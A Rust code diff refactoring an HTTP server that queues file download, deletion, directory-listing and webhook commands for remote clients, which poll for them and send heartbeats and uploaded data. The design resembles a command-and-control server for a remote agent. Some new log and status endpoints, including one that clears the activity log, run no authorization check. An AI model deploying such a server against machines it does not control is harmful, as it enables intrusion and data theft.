-                        let id = format!("download_{}", Utc::now().timestamp_millis());
-                        let cmd = Command { id: id.clone(), command_type: "download_file".into(), parameters: vec![path.to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-                        state.command_queue.lock().await.push(cmd.clone());
-                        state.notify.notify_waiters();
-                        println!("[UI] Download file command added: {} (path: {})", id, path);
-                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
-                    } else {
-                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
-                    }
-                }
-                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
-            }
-        }
-        (Method::POST, "/ui/add-delete-file") => {
-            let body = match req.into_body().collect().await {
-                Ok(collected) => collected.to_bytes(),
-                Err(_) => Bytes::new(),
-            };
-            match serde_json::from_slice::<serde_json::Value>(&body) {
-                Ok(data) => {
-                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
-                        let id = format!("delete_{}", Utc::now().timestamp_millis());
-                        let cmd = Command { id: id.clone(), command_type: "delete_file".into(), parameters: vec![path.to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-                        state.command_queue.lock().await.push(cmd.clone());
-                        state.notify.notify_waiters();
-                        println!("[UI] Delete file command added: {} (path: {})", id, path);
-                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
-                    } else {
-                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
-                    }
-                }
-                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
-            }
-        }
-        (Method::POST, "/ui/add-create-dir") => {
-            let body = match req.into_body().collect().await {
-                Ok(collected) => collected.to_bytes(),
-                Err(_) => Bytes::new(),
-            };
-            match serde_json::from_slice::<serde_json::Value>(&body) {
-                Ok(data) => {
-                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
-                        let id = format!("create_dir_{}", Utc::now().timestamp_millis());
-                        let cmd = Command { id: id.clone(), command_type: "create_dir".into(), parameters: vec![path.to_string(), "true".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-                        state.command_queue.lock().await.push(cmd.clone());
-                        state.notify.notify_waiters();
-                        println!("[UI] Create directory command added: {} (path: {})", id, path);
-                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
-                    } else {
-                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
-                    }
-                }
-                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
-            }
-        }
+        // ファイル管理コマンド（固定パス）
+        (Method::POST, "/ui/add-list-files") => handle_file_command(&state, "list_files", "list_files", vec![".", "false"]).await,
+        (Method::POST, "/ui/add-list-files-win") => handle_file_command(&state, "list_files_win", "list_files", vec!["C:\\", "false"]).await,
+        // ファイル操作（JSONパラメータ付き）
+        (Method::POST, "/ui/add-file-info") => handle_file_operation(&state, req, "file_info", "get_file_info").await,
+        (Method::POST, "/ui/add-download-file") => handle_file_operation(&state, req, "download", "download_file").await,
+        (Method::POST, "/ui/add-delete-file") => handle_file_operation(&state, req, "delete", "delete_file").await,
+        (Method::POST, "/ui/add-create-dir") => handle_file_operation(&state, req, "create_dir", "create_dir").await,
 
-        // Queue webhook send command (client will send the webhook)
-        (Method::POST, "/ui/queue-webhook") => {
-            let id = format!("webhook_{}", Utc::now().timestamp_millis());
-            let cmd = Command { id: id.clone(), command_type: "webhook_send".into(), parameters: vec![], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
-            state.command_queue.lock().await.push(cmd.clone());
-            state.notify.notify_waiters();
-            println!("[UI] Webhook-send command queued: {}", id);
-            Ok(json_response(json!({"ok": true}), StatusCode::OK))
-        }
+
+
+        // Webhook
+        (Method::POST, "/ui/queue-webhook") => handle_simple_command(&state, "webhook", "webhook_send").await,
 
         // Client endpoints ---------------------------------------------
 
@@ -390,63 +828,131 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
 
         (Method::POST, "/api/commands/response") => {
             if !is_authorized(&req) { return Ok(unauthorized()); }
-            let body = match req.into_body().collect().await {
-                Ok(collected) => collected.to_bytes(),
-                Err(_) => Bytes::new(),
-            };
-            match serde_json::from_slice::<Value>(&body) {
-                Ok(mut data) => {
-                    log_request(&Method::POST, "/api/commands/response", &remote, Some(&data));
-                    if let Some(obj) = data.as_object_mut() {
-                        obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
-                        obj.insert("server_timestamp".into(), Value::from(unix_time()));
-                    }
-                    state.response_log.lock().await.push(data);
-                    Ok(json_response(json!({"status":"received"}), StatusCode::OK))
+            handle_client_json_request(&state, req, |mut data| {
+                if let Some(obj) = data.as_object_mut() {
+                    obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
+                    obj.insert("server_timestamp".into(), Value::from(unix_time()));
                 }
-                Err(_) => Ok(json_response(json!({"error":"No JSON data provided"}), StatusCode::BAD_REQUEST))
-            }
+                data
+            }, "received").await
         }
 
         (Method::POST, "/api/heartbeat") => {
             if !is_authorized(&req) { return Ok(unauthorized()); }
-            let body = match req.into_body().collect().await {
-                Ok(collected) => collected.to_bytes(),
-                Err(_) => Bytes::new(),
-            };
-            match serde_json::from_slice::<Value>(&body) {
-                Ok(data) => {
-                    log_request(&Method::POST, "/api/heartbeat", &remote, Some(&data));
-                    let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
-                    let hostname  = data.get("hostname").and_then(|v| v.as_str()).unwrap_or("unknown");
-                    let status    = data.get("status").and_then(|v| v.as_str()).unwrap_or("unknown");
-                    println!("  → Heartbeat from {}@{}: {}", client_id, hostname, status);
-                    Ok(json_response(json!({"status":"received"}), StatusCode::OK))
-                }
-                Err(_) => Ok(json_response(json!({"error":"No JSON data provided"}), StatusCode::BAD_REQUEST))
-            }
+            handle_client_json_request(&state, req, |data| {
+                let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
+                let hostname = data.get("hostname").and_then(|v| v.as_str()).unwrap_or("unknown");
+                let status = data.get("status").and_then(|v| v.as_str()).unwrap_or("unknown");
+                
+                tokio::spawn({
+                    let state = state.clone();
+                    let data = data.clone();
+                    let client_id = client_id.to_string();
+                    let hostname = hostname.to_string();
+                    let status = status.to_string();
+                    async move {
+                        log_activity(&state, "HEARTBEAT", &format!("Client {}@{} status: {}", client_id, hostname, status), Some(&client_id), None, Some(data)).await;
+                    }
+                });
+                
+                println!("  → Heartbeat from {}@{}: {}", client_id, hostname, status);
+                data
+            }, "received").await
         }
 
         (Method::POST, "/api/data/upload") => {
             if !is_authorized(&req) { return Ok(unauthorized()); }
-            let body = match req.into_body().collect().await {
-                Ok(collected) => collected.to_bytes(),
-                Err(_) => Bytes::new(),
-            };
-            match serde_json::from_slice::<Value>(&body) {
-                Ok(upload) => {
-                    let client_id = upload.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
-                    let data_type = upload.get("data_type").and_then(|v| v.as_str()).unwrap_or("unknown");
-                    let filename = format!("uploaded_data_{}_{}.json", client_id, unix_time());
-                    if let Err(e) = std::fs::write(&filename, serde_json::to_string_pretty(&upload).unwrap_or_else(|_| "{}".into())) {
-                        eprintln!("Failed to save {}: {}", filename, e);
-                        return Ok(json_response(json!({"error":"Failed to save file"}), StatusCode::INTERNAL_SERVER_ERROR));
-                    }
+            handle_client_json_request(&state, req, |data| {
+                let client_id = data.get("client_id").and_then(|v| v.as_str()).unwrap_or("unknown");
+                let data_type = data.get("data_type").and_then(|v| v.as_str()).unwrap_or("unknown");
+                let filename = format!("uploaded_data_{}_{}.json", client_id, unix_time());
+                
+                if let Err(e) = std::fs::write(&filename, serde_json::to_string_pretty(&data).unwrap_or_else(|_| "{}".to_string())) {
+                    eprintln!("Failed to save {}: {}", filename, e);
+                } else {
                     println!("  → Data upload from {}: {} saved to {}", client_id, data_type, filename);
-                    Ok(json_response(json!({"status":"uploaded","filename":filename}), StatusCode::OK))
                 }
-                Err(_) => Ok(json_response(json!({"error":"No JSON data provided"}), StatusCode::BAD_REQUEST))
-            }
+                data
+            }, "uploaded").await
+        }
+
+        (Method::GET, "/api/status") => {
+            let q = state.command_queue.lock().await;
+            let r = state.response_log.lock().await;
+            let l = state.activity_log.lock().await;
+            let status = serde_json::json!({
+                "queue": q.len(),
+                "responses": r.len(),
+                "logs": l.len(),
+                "clients": if r.len() > 0 { 1 } else { 0 }, // 簡易的なクライアント検出
+                "server_time": unix_time(),
+                "uptime": std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs()
+            });
+            Ok(json_response(status, StatusCode::OK))
+        }
+
+        (Method::GET, "/api/logs") => {
+            let limit = parse_query_u64(&req, "limit", 50);
+            let offset = parse_query_u64(&req, "offset", 0);
+            
+            let logs = state.activity_log.lock().await;
+            let total = logs.len();
+            let start = offset.min(total as u64) as usize;
+            let end = (start + limit as usize).min(total);
+            
+            let logs_slice: Vec<LogEntry> = if start < total {
+                logs[start..end].iter().rev().cloned().collect() // 新しいものから表示
+            } else {
+                Vec::new()
+            };
+            
+            let response = serde_json::json!({
+                "logs": logs_slice,
+                "total": total,
+                "offset": offset,
+                "limit": limit,
+                "has_more": end < total
+            });
+            
+            Ok(json_response(response, StatusCode::OK))
+        }
+
+        (Method::POST, "/api/logs/clear") => {
+            let mut logs = state.activity_log.lock().await;
+            let cleared_count = logs.len();
+            logs.clear();
+            log_activity(&state, "INFO", &format!("Activity log cleared ({} entries)", cleared_count), None, None, None).await;
+            Ok(json_response(json!({"cleared": cleared_count, "status": "success"}), StatusCode::OK))
+        }
+
+
+
+        (Method::GET, "/api/responses") => {
+            let limit = parse_query_u64(&req, "limit", 10);
+            let command_id = parse_query_param(&req, "command_id");
+            
+            let responses = state.response_log.lock().await;
+            let filtered_responses: Vec<&Value> = if let Some(cmd_id) = command_id {
+                responses.iter()
+                    .filter(|r| r.get("command_id").and_then(|id| id.as_str()) == Some(&cmd_id))
+                    .take(limit as usize)
+                    .collect()
+            } else {
+                responses.iter()
+                    .rev()
+                    .take(limit as usize)
+                    .collect()
+            };
+            
+            let response = serde_json::json!({
+                "responses": filtered_responses,
+                "total": responses.len()
+            });
+            
+            Ok(json_response(response, StatusCode::OK))
         }
 
         _ => Ok(json_response(json!({"error":"Not Found"}), StatusCode::NOT_FOUND)),
@@ -455,11 +961,10 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    let cfg = Arc::new(load_config_or_default());
     let state = Arc::new(AppState {
         command_queue: Mutex::new(Vec::new()),
         response_log: Mutex::new(Vec::new()),
-        config: cfg.clone(),
+        activity_log: Mutex::new(Vec::new()),
         notify: Notify::new(),
     });
 
